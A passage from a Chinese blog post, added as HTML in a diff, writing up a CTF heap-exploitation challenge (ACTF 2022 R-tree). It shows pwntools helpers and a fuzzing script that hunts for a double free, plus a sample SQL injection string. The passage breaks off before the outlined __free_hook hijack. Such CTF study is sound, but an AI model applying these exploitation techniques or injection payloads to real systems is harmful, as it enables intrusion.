@@ -1,0 +1,855 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  
+  <title>
+    r树的秘密 |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="fuzzing?fuzzing!(ᗜᴗᗜ)| 0 | 前言如果你也遇到过:IDA反编译出来的数据结构充满了各种交叉引用与奇奇怪怪的数据结构,别说逆向分析了,就算是用gdb调试出来都是越看越晕✋别担心,fuzzing会帮你解决一切😇😇😇 | 1 | 原理通过查询gpt,我们获得以下信息 Fuzzing，中文一般翻译为“模糊测试”，是一种自动化测试技术，主要用于发现程序中的漏洞和异常行为。它的核">
+<meta property="og:type" content="article">
+<meta property="og:title" content="r树的秘密">
+<meta property="og:url" content="https://khighl.github.io.git/2025/06/28/fuzz/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="fuzzing?fuzzing!(ᗜᴗᗜ)| 0 | 前言如果你也遇到过:IDA反编译出来的数据结构充满了各种交叉引用与奇奇怪怪的数据结构,别说逆向分析了,就算是用gdb调试出来都是越看越晕✋别担心,fuzzing会帮你解决一切😇😇😇 | 1 | 原理通过查询gpt,我们获得以下信息 Fuzzing，中文一般翻译为“模糊测试”，是一种自动化测试技术，主要用于发现程序中的漏洞和异常行为。它的核">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://khighl.github.io.git/images/fuzz/1751101646406.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/fuzz/1751102252072.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/fuzz/1751102338203.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/fuzz/1751102451784.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/fuzz/1751102506395.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/fuzz/1751102613824.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/fuzz/1751103602912.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/fuzz/1751104492262.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/fuzz/1751105035960.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/fuzz/1751105068490.png">
+<meta property="article:published_time" content="2025-06-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-06-28T10:13:56.866Z">
+<meta property="article:author" content="zer00ne">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://khighl.github.io.git/images/fuzz/1751101646406.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="r树的秘密">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">r树的秘密</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fuzzing-fuzzing-%E1%97%9C%E1%B4%97%E1%97%9C"><span class="toc-number">1.</span> <span class="toc-text">fuzzing?fuzzing!(ᗜᴗᗜ)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">| 0 | 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">| 1 | 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-ACTF%E2%80%93%E8%AE%A9%E6%88%91%E4%BB%AC%E8%A7%A3%E5%BC%80R%E6%A0%91%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">1.3.</span> <span class="toc-text">| 2 | ACTF–让我们解开R树的秘密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%87%A0%E4%B9%8E%E6%B2%A1%E6%9C%89%E6%84%8F%E4%B9%89%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.3.1.</span> <span class="toc-text">2.1 几乎没有意义的逆向分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#R%E6%A0%91%E7%9A%84%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">R树的介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E5%A4%A7%E6%A6%82%E6%93%8D%E4%BD%9C%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">对大概操作的理解</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2%E5%BC%80%E5%A7%8Bfuzzing"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.2开始fuzzing!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E4%BA%BA%E8%84%91%E4%BB%A3%E6%9B%BF%E7%94%B5%E8%84%91%E6%80%9D%E8%80%83-%E5%A0%86%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.3.</span> <span class="toc-text">2.3 人脑代替电脑思考-堆利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#double-free%E7%9A%84%E5%8A%AB%E6%8C%81"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">double free的劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#teache-struct"><span class="toc-number">1.3.3.1.1.</span> <span class="toc-text">teache_struct</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">泄露libc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E4%B8%80%E6%AD%A5-%E5%8A%AB%E6%8C%81-free-hook"><span class="toc-number">1.3.4.</span> <span class="toc-text">最后一步,劫持__free_hook</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-fuzz" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-06-27T16:00:00.000Z" itemprop="datePublished">2025-06-28</time>
+    <time style="display: none;" id="post-update-time">2025-06-28</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="fuzzing-fuzzing-ᗜᴗᗜ"><a href="#fuzzing-fuzzing-ᗜᴗᗜ" class="headerlink" title="fuzzing?fuzzing!(ᗜᴗᗜ)"></a>fuzzing?fuzzing!(ᗜᴗᗜ)</h1><h2 id="0-前言"><a href="#0-前言" class="headerlink" title="| 0 | 前言"></a>| 0 | 前言</h2><p>如果你也遇到过:IDA反编译出来的数据结构充满了各种交叉引用与奇奇怪怪的数据结构,别说逆向分析了,就算是用gdb调试出来都是越看越晕✋别担心,fuzzing会帮你解决一切😇😇😇</p>
+<h2 id="1-原理"><a href="#1-原理" class="headerlink" title="| 1 | 原理"></a>| 1 | 原理</h2><p>通过查询<code>gpt</code>,我们获得以下信息</p>
+<p>Fuzzing，中文一般翻译为“<strong>模糊测试</strong>”，是一种自动化测试技术，主要用于<strong>发现程序中的漏洞和异常行为</strong>。它的核心思想就像是：</p>
+<blockquote>
+<p>「嘿<del>我往你的程序里灌各种奇怪、乱七八糟的输入，看看你会不会崩溃</del>(*≧▽≦)ﾉｼ）」</p>
+</blockquote>
+<p>比如你有个程序需要用户输入用户名，那Fuzzer就会试着输入：</p>
+<ul>
+<li>超长字符串（比如上万字节的“AAAAAAAA…”）</li>
+<li>特殊字符（比如 <code>&quot;; DROP TABLE users; --</code> ）</li>
+<li>随机的二进制数据</li>
+<li>不合规范的结构化数据（比如错误格式的PNG、PDF）</li>
+</ul>
+<p>通过不断“瞎试”，来诱发程序中的各种bug，比如：</p>
+<ul>
+<li>崩溃（Crash）</li>
+<li>越界访问</li>
+<li>Use-After-Free（UAF）</li>
+<li>内存泄露</li>
+<li>未处理的异常</li>
+</ul>
+<p>当我们完全看不懂数据结构的内部逻辑时,我们可以通过灌入大量数据,通过python捕捉<code>uaf</code>,<code>overflow</code>等错误,以此我们可以找到达成漏洞利用的具体手段,作为一个模块用来稳定获得一个漏洞,再在这个漏洞上不断利用,最后<code>getshell</code></p>
+<h2 id="2-ACTF–让我们解开R树的秘密"><a href="#2-ACTF–让我们解开R树的秘密" class="headerlink" title="| 2 | ACTF–让我们解开R树的秘密"></a>| 2 | ACTF–让我们解开R树的秘密</h2><p>题目链接: <a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3283">actf 2022</a></p>
+<p>注: 本题的libc版本为2.27</p>
+<h3 id="2-1-几乎没有意义的逆向分析"><a href="#2-1-几乎没有意义的逆向分析" class="headerlink" title="2.1 几乎没有意义的逆向分析"></a>2.1 几乎没有意义的逆向分析</h3><p>我们使用IDA打开elf文件后,可以看到这是个完整的菜单题</p>
+<p><img src="/images/fuzz/1751101646406.png" alt="1751101646406"></p>
+<p>往左边的函数栏一瞟,被吓了一跳:每个操作函数函数(<code>insert</code>,<code>delet</code>,<code>edit</code>,<code>show</code>和<code>query</code>)都由<code>大量子函数进行数据结构的维护</code></p>
+<p>这导致如果我们从IDA分析,逆向难度会非常大,通过题目名字和几个维护函数我们也能猜出来本次管理堆块的数据结构是<code>R树</code></p>
+<p>那么<code>R树</code>是什么呢?</p>
+<h4 id="R树的介绍"><a href="#R树的介绍" class="headerlink" title="R树的介绍"></a><strong>R树的介绍</strong></h4><p><strong>R树（Rectangle-tree 或 Region-tree）</strong> 是一种**用来存储多维空间数据（比如矩形、坐标点、地理位置）**的数据结构。它就像是空间版本的 B 树，用于高效地执行：</p>
+<ul>
+<li>📍<strong>范围查询（range query）</strong>：找出所有在某个区域内的点或图形</li>
+<li>🧲<strong>邻近查询（nearest neighbor）</strong>：找出离你最近的对象</li>
+<li>📦<strong>插入、删除、更新空间对象</strong></li>
+</ul>
+<p>比起传统的哈希表或数组，R树在“处理空间位置”这种问题时简直不要太强！</p>
+<p>R树是一种 <strong>高度平衡的树结构</strong>，跟 B 树有点像，但它的每个节点存的不是单个值，而是：</p>
+<blockquote>
+<p>✅ 一个“最小包围矩形（MBR，Minimum Bounding Rectangle）”——用来包住子节点或实际对象。</p>
+</blockquote>
+<p>举个栗子🌰：</p>
+<ul>
+<li>叶子节点存放：真实的矩形、点等空间对象</li>
+<li>非叶子节点存放：子节点的 MBR，代表这个子节点下所有数据的范围</li>
+</ul>
+<p>使用<code>css</code>表示为</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">     ┌────────────┐</span><br><span class="line">     │   MBR <span class="selector-tag">A</span>    │</span><br><span class="line">     └────┬───────┘</span><br><span class="line">          ↓</span><br><span class="line">   ┌───────────────┐</span><br><span class="line">   │ MBR A1 │ MBR A2│</span><br><span class="line">   └────┬────┴──────┘</span><br><span class="line">        ↓</span><br><span class="line">┌───────────────┐</span><br><span class="line">│ obj1 obj2 ... │  （叶节点）</span><br><span class="line">└───────────────┘</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><del>不知道你们看懂多少,反正我是一点没看懂</del></p>
+<h4 id="对大概操作的理解"><a href="#对大概操作的理解" class="headerlink" title="对大概操作的理解"></a>对大概操作的理解</h4><p>虽然我们基本上不可能看懂<code>R树</code>,但可以简单逆向一下几个函数的功能</p>
+<ol>
+<li><p>add函数</p>
+<p><img src="/images/fuzz/1751102252072.png" alt="1751102252072"><br>通过输入<code>x</code>,<code>y</code>确定堆块的索引</p>
+<p>可以申请<code>0x30</code>的堆块,并以某种规则插上<code>R树</code>,可以且必须输入<code>0x20</code>的数据</p>
+</li>
+<li><p>delet函数</p>
+<p><img src="/images/fuzz/1751102338203.png" alt="1751102338203"></p>
+<p>通过<code>x</code>,<code>y</code>索引寻找堆块,然后对堆块进行释放,置零(我们没法简单double free)</p>
+</li>
+<li><p>edit函数</p>
+<p><img src="/images/fuzz/1751102451784.png" alt="1751102451784"></p>
+<p>通过<code>x</code>,<code>y</code>索引寻找堆块,编辑堆块,必须输入<code>0x20</code>的内容</p>
+</li>
+<li><p>show函数</p>
+<p><img src="/images/fuzz/1751102506395.png" alt="1751102506395"></p>
+<p>通过<code>x</code>,<code>y</code>索引寻找堆块,使用write函数打印堆块中的内容</p>
+</li>
+<li><p>query函数</p>
+<p><img src="/images/fuzz/1751102613824.png" alt="1751102613824"></p>
+<p>接收用户输入的矩形范围（左下角和右上角），然后在 R 树中查找所有在这个区域内的元素并输出它们的名字(这不是和show函数功能重合了吗🤔)</p>
+</li>
+</ol>
+<h3 id="2-2开始fuzzing"><a href="#2-2开始fuzzing" class="headerlink" title="2.2开始fuzzing!"></a>2.2开始fuzzing!</h3><p>我们先在exp中模拟好这5个交互函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cho</span>(<span class="params">num</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(num).encode())</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x,y,name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;add(<span class="subst">&#123;x&#125;</span>,<span class="subst">&#123;y&#125;</span>)&quot;</span>)</span><br><span class="line">    cho(<span class="number">0</span>)</span><br><span class="line">    data=r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;two many&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">raise</span> TooManyElementsError</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(x).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(y).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;new element name: &quot;</span>,name.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">x,y</span>):</span><br><span class="line">    cho(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;want element x-coordinate value: &quot;</span>,<span class="built_in">str</span>(x).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;want element y-coordinate value: &quot;</span>,<span class="built_in">str</span>(y).encode())</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">x,y,name</span>):</span><br><span class="line">    cho(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;want element x-coordinate value: &quot;</span>,<span class="built_in">str</span>(x).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;want element y-coordinate value: &quot;</span>,<span class="built_in">str</span>(y).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;name: &quot;</span>,name.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">x,y</span>):</span><br><span class="line">    cho(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;value&#x27;</span>,<span class="built_in">str</span>(x).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;value&#x27;</span>,<span class="built_in">str</span>(y).encode())</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">a,b,c,d</span>):</span><br><span class="line">    cho(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(a).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(b).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(c).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(d).encode())</span><br></pre></td></tr></table></figure>
+
+<p>现在我们要开始请”猴子先生”开始随机敲击键盘😋</p>
+<p>但是我们也不能真的随便瞎按,我使用了一下的约束保证fuzz不会太离谱</p>
+<ul>
+<li>只能释放已经建立的堆块</li>
+<li>堆块的索引不能重复</li>
+<li>将每次fuzz的结果放在一个txt中</li>
+<li>自定义一个<code>EOF</code>保证fuzz只有在<code>double free</code>时才会停止</li>
+</ul>
+<p>我们可以使用以下脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TooManyElementsError</span>(<span class="title class_ inherited__">Exception</span>): <span class="comment">#如果树满了我们还没找到异常,就抛出这个</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fuzz</span>():</span><br><span class="line">    <span class="keyword">global</span> f</span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&#x27;./log.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="comment">#记录我们fuzz的过程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>):</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">10</span>==<span class="number">0</span>):</span><br><span class="line">            a = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            b = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            add(a,b,<span class="built_in">str</span>(i).encode())</span><br><span class="line">            data0=r.recvuntil(<span class="string">b&#x27;Choice Table&#x27;</span>)</span><br><span class="line">            f.write(<span class="string">&#x27;add(&#123;&#125;,&#123;&#125;,str(&#123;&#125;).encode())\n&#x27;</span>.<span class="built_in">format</span>(a,b,i))</span><br><span class="line">        <span class="keyword">elif</span>(i%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">            a = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            b = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            delet(a,b)</span><br><span class="line">            data0=r.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;not exists&#x27;</span> <span class="keyword">in</span> data0: <span class="comment">#只有释放存在堆块的操作才会被记录</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            f.write(<span class="string">&#x27;delet(&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">global</span> f</span><br><span class="line">    r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fuzz()</span><br><span class="line">    <span class="keyword">except</span> TooManyElementsError: <span class="comment">#如果没找到漏洞,我们要重投开始</span></span><br><span class="line">        f.close()</span><br><span class="line">        os.remove(<span class="string">&quot;./log.txt&quot;</span>)   <span class="comment">#清空记录</span></span><br><span class="line">        r.close()</span><br><span class="line">    <span class="keyword">except</span> EOFError:             <span class="comment">#找到了漏洞</span></span><br><span class="line">        f.close()</span><br><span class="line">        line_count = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;log.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment">#查询有效命令的数量</span></span><br><span class="line">        <span class="keyword">if</span> line_count&lt;<span class="number">20</span>:        <span class="comment">#我希望double free的堆风水的步骤简单一点</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span 